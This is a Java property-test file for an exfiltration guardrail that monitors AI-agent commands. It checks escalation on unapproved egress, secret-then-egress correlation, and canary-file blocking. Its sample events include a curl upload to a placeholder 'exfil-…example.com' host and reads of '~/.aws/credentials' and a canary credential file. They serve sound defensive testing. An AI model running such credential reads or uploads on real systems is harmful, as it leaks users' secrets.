package com.intentguard.exfil;

import java.time.Clock;
import java.time.Instant;
import java.time.ZoneId;
import java.time.ZoneOffset;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

import com.intentguard.domain.Actor;
import com.intentguard.domain.AgentRiskMarkers;
import com.intentguard.domain.CommandEvent;
import com.intentguard.domain.CorrectiveAction;

import net.jqwik.api.ForAll;
import net.jqwik.api.Property;
import net.jqwik.api.constraints.AlphaChars;
import net.jqwik.api.constraints.IntRange;
import net.jqwik.api.constraints.NotBlank;
import net.jqwik.api.constraints.StringLength;

/**
 * Feature: intentguard-guardrails, Property 24: Exfiltration guardrails escalate egress, correlate
 * secret+egress, and block canaries (Stretch).
 *
 * <p>For any Command_Event opening an outbound connection to a destination not on the approved
 * list, the Corrective_Action floor is at least ASK and the destination is recorded; for any
 * session where a secret/credential access is followed within the correlation window by an outbound
 * connection, a correlated-exfiltration alert is raised, recorded, and raises the floor to at least
 * ASK; and for any event accessing a configured CanaryToken, the Corrective_Action is BLOCK with a
 * high-risk alert recorded.
 *
 * <p>Validates: Requirements 6.1, 6.2, 6.3, 6.4, 6.5.
 *
 * <p>The guard is exercised directly with a settable {@link Clock} and an in-memory
 * {@link ExfiltrationConfig} — no live datastore is involved.
 */
class ExfiltrationCorrelatorProperties {

    private static final String APPROVED_DESTINATION = "approved.internal";
    private static final String CANARY_ID = "canary-aws";
    private static final String CANARY_MATCHER = "/opt/creds/*.canary";

    private static ExfiltrationConfig config(long windowMs) {
        return new ExfiltrationConfig(
                List.of(APPROVED_DESTINATION),
                List.of("~/.aws/credentials"),
                List.of(new CanaryToken(CANARY_ID, CANARY_MATCHER)),
                windowMs);
    }

    @Property(tries = 200)
    void exfiltrationGuardrailsEscalateCorrelateAndBlock(
            @ForAll @AlphaChars @StringLength(min = 3, max = 8) String destToken,
            @ForAll @NotBlank @AlphaChars @StringLength(min = 1, max = 6) String session,
            @ForAll @IntRange(min = 1, max = 600_000) int windowMs,
            @ForAll @IntRange(min = 0, max = 1_200_000) int gapMs) {

        String unapprovedDestination = "exfil-" + destToken + ".example.com";
        String sessionId = "sess-" + session;

        // --- 6.1: unapproved egress raises the floor to ASK and records the destination ---------
        {
            SettableClock clock = new SettableClock(1_000_000L);
            ExfiltrationCorrelator guard = new ExfiltrationCorrelator(clock);

            ExfiltrationContribution unapproved =
                    guard.evaluate(egress(sessionId, unapprovedDestination), config(windowMs));

            assertThat(unapproved.floor().ordinal())
                    .isGreaterThanOrEqualTo(CorrectiveAction.ASK.ordinal());
            assertThat(unapproved.recordedDestinations()).contains(unapprovedDestination);
            assertThat(unapproved.triggeredGuardrailIds())
                    .contains(ExfiltrationContribution.UNAPPROVED_EGRESS_TRIGGER_ID);
            assertThat(unapproved.canaryHit()).isFalse();

            // An approved destination must NOT raise the floor via the egress rule.
            ExfiltrationCorrelator approvedGuard = new ExfiltrationCorrelator(new SettableClock(1L));
            ExfiltrationContribution approved =
                    approvedGuard.evaluate(egress(sessionId, APPROVED_DESTINATION), config(windowMs));
            assertThat(approved.floor()).isEqualTo(CorrectiveAction.ALLOW);
            assertThat(approved.triggeredGuardrailIds())
                    .doesNotContain(ExfiltrationContribution.UNAPPROVED_EGRESS_TRIGGER_ID);
        }

        // --- 6.2/6.3: secret access then egress within the window correlates --------------------
        {
            SettableClock clock = new SettableClock(2_000_000L);
            ExfiltrationCorrelator guard = new ExfiltrationCorrelator(clock);

            // Event 1: access a secret in the session (no egress) — no floor by itself.
            ExfiltrationContribution secretHit =
                    guard.evaluate(secretAccess(sessionId), config(windowMs));
            assertThat(secretHit.floor()).isEqualTo(CorrectiveAction.ALLOW);
            assertThat(secretHit.correlatedExfilAlert()).isFalse();

            // Event 2: after gapMs, open an outbound connection to an APPROVED destination so the
            // only possible escalation is the secret+egress correlation.
            clock.advance(gapMs);
            ExfiltrationContribution egressHit =
                    guard.evaluate(egress(sessionId, APPROVED_DESTINATION), config(windowMs));

            boolean withinWindow = gapMs <= windowMs;
            assertThat(egressHit.correlatedExfilAlert()).isEqualTo(withinWindow);
            if (withinWindow) {
                assertThat(egressHit.floor().ordinal())
                        .isGreaterThanOrEqualTo(CorrectiveAction.ASK.ordinal());
                assertThat(egressHit.triggeredGuardrailIds())
                        .contains(ExfiltrationContribution.CORRELATED_EXFIL_TRIGGER_ID);
            } else {
                assertThat(egressHit.floor()).isEqualTo(CorrectiveAction.ALLOW);
            }
        }

        // --- 6.4/6.5: canary access forces BLOCK with a high-risk alert -------------------------
        {
            SettableClock clock = new SettableClock(3_000_000L);
            ExfiltrationCorrelator guard = new ExfiltrationCorrelator(clock);

            ExfiltrationContribution canaryHit =
                    guard.evaluate(canaryAccess(sessionId), config(windowMs));

            assertThat(canaryHit.canaryHit()).isTrue();
            assertThat(canaryHit.highRiskAlert()).isTrue();
            assertThat(canaryHit.floor()).isEqualTo(CorrectiveAction.BLOCK);
            assertThat(canaryHit.triggeredGuardrailIds()).contains(CANARY_ID);
        }
    }

    // --- event builders -------------------------------------------------------------------------

    private static CommandEvent egress(String sessionId, String destination) {
        return new CommandEvent(
                "evt-egress",
                Actor.agent("agent-1", "alice"),
                sessionId,
                "curl https://" + destination + "/upload",
                "/home/alice/project",
                null,
                Map.of("destination", destination),
                1_710_000_000_000L,
                null,
                null,
                null,
                new AgentRiskMarkers(true, false, false));
    }

    private static CommandEvent secretAccess(String sessionId) {
        return new CommandEvent(
                "evt-secret",
                Actor.agent("agent-1", "alice"),
                sessionId,
                "cat ~/.aws/credentials",
                "/home/alice/project",
                null,
                Map.of(),
                1_710_000_000_000L,
                null,
                null,
                null,
                new AgentRiskMarkers(false, true, false));
    }

    private static CommandEvent canaryAccess(String sessionId) {
        return new CommandEvent(
                "evt-canary",
                Actor.agent("agent-1", "alice"),
                sessionId,
                "cat /opt/creds/aws.canary",
                "/home/alice/project",
                null,
                Map.of(),
                1_710_000_000_000L,
                null,
                null,
                null,
                new AgentRiskMarkers(false, true, false));
    }

    /** A {@link Clock} whose instant can be advanced deterministically within a test. */
    private static final class SettableClock extends Clock {
        private long millis;

        SettableClock(long startMillis) {
            this.millis = startMillis;
        }

        void advance(long deltaMillis) {
            this.millis += deltaMillis;
        }

        @Override
        public long millis() {
            return millis;
        }

        @Override
        public ZoneId getZone() {
            return ZoneOffset.UTC;
        }

        @Override
        public Clock withZone(ZoneId zone) {
            return this;
        }

        @Override
        public Instant instant() {
            return Instant.ofEpochMilli(millis);
        }
    }
}
